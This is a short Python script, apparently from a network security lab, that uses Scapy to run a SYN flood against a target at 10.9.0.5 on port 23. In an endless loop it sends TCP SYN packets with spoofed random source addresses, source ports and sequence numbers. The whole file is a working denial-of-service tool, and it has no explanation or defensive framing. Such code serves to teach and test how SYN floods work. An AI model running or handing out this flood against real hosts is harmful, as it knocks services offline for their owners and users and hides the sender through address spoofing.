#!/usr/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

# Target victim
TARGET_IP = "10.9.0.5"
TARGET_PORT = 23

# Base IP and TCP layers
ip = IP(dst=TARGET_IP)
tcp = TCP(dport=TARGET_PORT, flags="S")

packet = ip / tcp

print("Starting SYN flood attack...")

while True:
    # Spoof random source IP
    packet[IP].src = str(IPv4Address(getrandbits(32)))

    # Random source port
    packet[TCP].sport = getrandbits(16)

    # Random sequence number
    packet[TCP].seq = getrandbits(32)

    send(packet, verbose=0)